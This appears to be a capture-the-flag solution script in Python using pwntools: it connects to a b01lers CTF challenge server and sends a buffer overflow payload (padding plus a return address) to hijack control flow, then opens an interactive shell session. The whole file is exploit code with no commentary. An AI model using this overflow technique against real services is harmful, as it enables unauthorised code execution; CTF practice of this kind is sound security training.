#!/usr/bin/python3
from pwn import *
from past.builtins import xrange
from time import sleep
import random

if __name__ == '__main__':
	io = remote('chal.ctf.b01lers.com',1015)

	io.sendlineafter('Thyself.\n',b'A'*0x18+p64(0x00401196))
	io.interactive()
